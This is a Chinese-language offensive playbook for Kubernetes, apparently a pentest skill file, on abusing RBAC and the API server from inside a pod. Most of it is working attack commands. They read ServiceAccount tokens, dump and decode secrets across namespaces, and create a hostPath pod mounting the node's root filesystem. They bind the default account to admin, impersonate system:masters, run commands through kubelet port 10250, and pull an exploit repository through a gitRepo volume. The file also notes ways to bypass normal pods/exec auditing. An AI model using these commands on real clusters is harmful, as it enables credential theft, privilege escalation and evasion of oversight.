# K8s RBAC 与 API 滥用路径

本文档补充从 Pod 内或拿到 ServiceAccount Token 后的 API 调用、权限判断和 RBAC 滥用路径。重点是先确认当前身份能做什么，再选择 Secret 读取、Pod 创建、exec、impersonate 或控制器资源注入。

---

## 1. Pod 内默认信息

K8s Pod 通常会自动挂载 ServiceAccount Token、namespace 和 CA 证书：

```bash
SA_DIR=/var/run/secrets/kubernetes.io/serviceaccount
TOKEN=$(cat $SA_DIR/token 2>/dev/null)
NAMESPACE=$(cat $SA_DIR/namespace 2>/dev/null)
CA_CERT=$SA_DIR/ca.crt
APISERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
```

还可以从环境变量中确认 API Server 和同 namespace 服务：

```bash
env | grep -E 'KUBERNETES_SERVICE|_SERVICE_HOST|_SERVICE_PORT'
```

环境变量只能说明 Pod 创建时已存在的 Service；后创建的 Service 不会自动注入，需要结合 DNS 或 API 枚举。

---

## 2. 没有 kubectl 时模拟 API 请求

容器内没有 `kubectl` 时，可以用本地 `kubectl -v9` 生成等价 HTTP 请求，再替换为 Pod 内的 API Server 与 Token。

流程：

1. 在有 kubeconfig 的机器上执行目标命令并加 `-v9`。
2. 从输出中提取 URL、HTTP 方法、请求体和必要 header。
3. 将 URL host 替换为 `$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT`。
4. 将 `Authorization: Bearer` 替换为 Pod 内 SA Token。
5. 如果有 body，补 `Content-Type: application/json`。

示例：用 `SelfSubjectRulesReview` 获取当前 namespace 权限：

```bash
curl -sS --cacert "$CA_CERT" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -X POST "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  --data '{"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","spec":{"namespace":"'"$NAMESPACE"'"}}'
```

如果 CA 校验失败但确认是实验/授权环境，可临时使用 `-k` 排障；正式记录中应优先保留 CA 校验。

---

## 3. 权限自检优先级

先用 `kubectl auth can-i --list` 或 `SelfSubjectRulesReview` 看全量权限，再针对高危动作逐项确认。

```bash
kubectl auth can-i --list
kubectl auth can-i list secrets -n kube-system
kubectl auth can-i create pods -n kube-system
kubectl auth can-i create rolebindings -n default
kubectl auth can-i impersonate users
kubectl auth can-i get nodes/proxy
```

高危权限对应路径：

| 权限 | 价值 | 后续动作 |
|---|---|---|
| `list/get secrets` | 读取凭据和 SA Token | 枚举所有 namespace 的 Secret |
| `create pods` | 创建特权 Pod 或挂载高权限 SA | 节点逃逸 / Token 窃取 |
| `pods/exec` | 进入已有 Pod | 优先找 kube-system 或高权限工作负载 |
| `create/patch rolebindings` | 绑定更高权限 | 自我提权到 admin/cluster-admin |
| `impersonate` | 模拟高权限用户/组 | 尝试 `system:masters` 或高权限 SA |
| `get nodes/proxy` | 代理到 kubelet | 可能绕过 `pods/exec` 正常审计路径 |
| `patch daemonsets/deployments` | 注入控制器 | 扩散到多节点或高权限 Pod |

---

## 4. Secrets 与 ConfigMaps

Secrets/ConfigMaps 可能以环境变量或只读 tmpfs volume 形式出现在容器内。从容器内部无法仅凭环境变量判断来源，所以需要人工看变量名和值。

```bash
# 容器内查挂载
mount | grep -F 'tmpfs' | grep -F 'ro'
find /var/run/secrets -type f 2>/dev/null
find / -maxdepth 4 -type f \( -name '*token*' -o -name '*secret*' -o -name '*.crt' \) 2>/dev/null
```

如果 RBAC 允许列 Secret：

```bash
kubectl get secrets --all-namespaces
kubectl get secret SECRET_NAME -n NAMESPACE -o json | jq -r '.data | to_entries[] | "\(.key)=\(.value|@base64d)"'
```

API 方式：

```bash
curl -sk -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/namespaces/kube-system/secrets/"
```

---

## 5. Pod 创建与 badPods 模板

拥有 `create pods` 权限时，可以创建带危险 securityContext、hostPath、hostPID 或 hostNetwork 的 Pod。使用 BishopFox badPods 这类模板时，先按目标权限和 Pod Security 限制选择最小模板，避免直接套 `everything-allowed`。

| 模板类型 | 需要能力 | 用途 |
|---|---|---|
| privileged | 创建 privileged Pod 未被策略拦截 | 直接挂载宿主机或 nsenter |
| hostPath | 允许 hostPath | 读取/写入宿主机路径 |
| hostPID | 允许 hostPID | 进入宿主机进程 namespace |
| hostNetwork | 允许 hostNetwork | 访问节点网络、Metadata 或本地服务 |
| nothing-allowed | 权限受限环境 | 验证最小 Pod 创建能力 |

示例：创建 hostPath Pod 挂载宿主机根目录：

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: hostpath-check
  namespace: default
spec:
  containers:
  - name: alpine
    image: alpine
    command: ["sleep", "86400"]
    volumeMounts:
    - mountPath: /host
      name: host-root
  volumes:
  - name: host-root
    hostPath:
      path: /
```

---

## 6. pods/exec 与高权限 Pod

拥有 `pods/exec` 不等于能创建新 Pod，但可以进入已有 Pod。优先级：

1. `kube-system`、`monitoring`、`logging`、`ingress` 命名空间。
2. 挂载云凭据、Registry 凭据或 admin kubeconfig 的 Pod。
3. 使用高权限 ServiceAccount 的控制器 Pod。

```bash
kubectl get pods --all-namespaces -o wide
kubectl exec -it POD_NAME -n NAMESPACE -- sh
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

---

## 7. RoleBinding / ClusterRoleBinding 提权

如果能创建或 patch RoleBinding/ClusterRoleBinding，可以把当前 SA 绑定到更高权限角色。

```bash
kubectl create rolebinding pwn-admin \
  --clusterrole=admin \
  --serviceaccount="$NAMESPACE:default" \
  -n "$NAMESPACE"
```

如果只有 namespace 级 RoleBinding 权限，通常只能拿到该 namespace 的 admin；如果能创建 ClusterRoleBinding，才可能直接获取 cluster-admin。

---

## 8. Impersonate 权限

`impersonate` 允许用当前 Token 假扮用户、组或 ServiceAccount。不要只测 `system:masters`，还要测真实高权限 SA。

```bash
kubectl get secrets --as=null --as-group=system:masters
kubectl get pods --as=system:serviceaccount:kube-system:default
```

REST API：

```bash
curl -sk -H "Authorization: Bearer $TOKEN" \
  -H "Impersonate-User: null" \
  -H "Impersonate-Group: system:masters" \
  "$APISERVER/api/v1/namespaces/kube-system/secrets/"
```

---

## 9. Kubelet 10250 / 10255

10255 只读端口主要用于信息泄露；10250 如果匿名或 Token 权限配置错误，可执行命令。

```bash
# 只读信息
curl -s http://NODE_IP:10255/pods

# 10250 列 Pod
curl -sk https://NODE_IP:10250/pods

# 旧式 run 端点
curl -sk https://NODE_IP:10250/run/NAMESPACE/POD/CONTAINER -d 'cmd=id'

# exec 端点参数形式
curl -Gsk "https://NODE_IP:10250/exec/NAMESPACE/POD/CONTAINER" \
  -d 'input=1' -d 'output=1' -d 'tty=1' -d 'command=id'
```

如果 API Server 审计严密但节点 10250 可达，`nodes/proxy` 权限还可能允许绕过常规 `pods/exec` 路径，详见 `cluster-attacks.md` 中 nodes/proxy WebSocket 小节。

---

## 10. gitRepo Volume 代码执行

`gitRepo` volume 会在 Pod 启动时从指定 Git 仓库拉取内容。该类型已不推荐使用，但老集群或特定环境仍可能启用。利用前提：

- 集群允许 `gitRepo` volume 类型。
- 当前身份可以创建 Pod。
- 目标节点能访问攻击者控制的 Git 仓库。

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: gitrepo-check
spec:
  containers:
  - image: alpine:latest
    command: ["sleep", "86400"]
    name: test-container
    volumeMounts:
    - mountPath: /gitrepo
      name: gitvolume
  volumes:
  - name: gitvolume
    gitRepo:
      directory: g/.git
      repository: https://github.com/raesene/repopodexploit.git
      revision: main
```

如果 Pod 创建失败，查看 Admission/PodSecurity 错误，判断是 volume 类型被禁用、策略拦截还是镜像拉取失败。

---

## 11. KubeHound 攻击路径分析

KubeHound 适合在大型集群中做攻击图分析，避免靠人工枚举遗漏路径。它更适合离线分析或授权评估，不适合在目标 Pod 内临时运行。

关注查询方向：

```text
kh.containers().criticalPaths().count()
kh.endpoints(EndpointExposure.ClusterIP).criticalPaths().count()
kh.endpoints(EndpointExposure.NodeIP).criticalPaths().count()
kh.endpoints(EndpointExposure.External).criticalPaths().count()
kh.services().criticalPaths().count()
```

当发现 External/NodeIP 暴露服务有 critical path 时，优先回到 `k8s-network-recon` 和对应服务技能验证可达性与影响。
